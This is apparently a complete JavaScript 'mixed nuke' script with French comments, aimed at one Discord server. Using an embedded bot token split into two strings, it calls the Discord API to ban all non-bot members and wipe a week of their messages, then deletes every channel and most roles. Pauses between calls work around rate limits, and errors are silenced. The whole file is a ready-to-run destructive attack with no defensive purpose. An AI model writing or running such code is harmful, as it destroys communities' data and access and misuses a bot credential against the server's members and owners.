const part1 = "MTU2NjQ3NDIzNzc0MzczNDk0NQ.GkOjNe.";
const part2 = "9WkxRc2uaempXmyLz_WAfIiSU_WjR14MVRMqE8";
const botToken = part1 + part2;
const guild = "1534554643583995936";

async function mixedNuke() {
  console.log("démarrage du mixed nuke...");

  // 1. on lance les bans en arrière-plan (sans attendre)
  console.log("--- LANCEMENT DES BANS EN ARRIERE-PLAN ---");
  fetch(`https://discord.com/api/v9/guilds/${guild}/members?limit=1000`, {
    headers: { "Authorization": `Bot ${botToken}` }
  }).then(res => res.json()).then(members => {
    if (members.message) return;
    members.forEach(m => {
      if (m.user.bot) return;
      fetch(`https://discord.com/api/v9/guilds/${guild}/bans/${m.user.id}`, {
        method: "PUT",
        headers: { "Authorization": `Bot ${botToken}`, "Content-Type": "application/json" },
        body: JSON.stringify({ delete_message_seconds: 604800 })
      }).catch(() => {});
    });
  }).catch(() => {});

  // 2. on supprime les salons direct avec une mini pause
  console.log("--- SUPPRESSION DES SALONS ---");
  let channels = await (await fetch(`https://discord.com/api/v9/guilds/${guild}/channels`, {
    headers: { "Authorization": `Bot ${botToken}` }
  })).json();
  
  if (channels.message) {
    console.log("erreur :", channels.message);
    return;
  }

  for (let c of channels) {
    await fetch(`https://discord.com/api/v9/channels/${c.id}`, {
      method: "DELETE",
      headers: { "Authorization": `Bot ${botToken}` }
    }).catch(() => {});
    console.log(`salon supprimé : ${c.name}`);
    await new Promise(r => setTimeout(r, 200)); // pause de 0.2s
  }

  // 3. on supprime les rôles avec la même mini pause
  console.log("--- SUPPRESSION DES RÔLES ---");
  let roles = await (await fetch(`https://discord.com/api/v9/guilds/${guild}/roles`, {
    headers: { "Authorization": `Bot ${botToken}` }
  })).json();
  
  if (!roles.message) {
    for (let r of roles) {
      if (r.name === "@everyone" || r.managed) continue;
      await fetch(`https://discord.com/api/v9/guilds/${guild}/roles/${r.id}`, {
        method: "DELETE",
        headers: { "Authorization": `Bot ${botToken}` }
      }).catch(() => {});
      console.log(`rôle supprimé : ${r.name}`);
      await new Promise(r => setTimeout(r, 200)); // pause de 0.2s
    }
  }

  console.log("fin du mixed nuke.");
}

mixedNuke();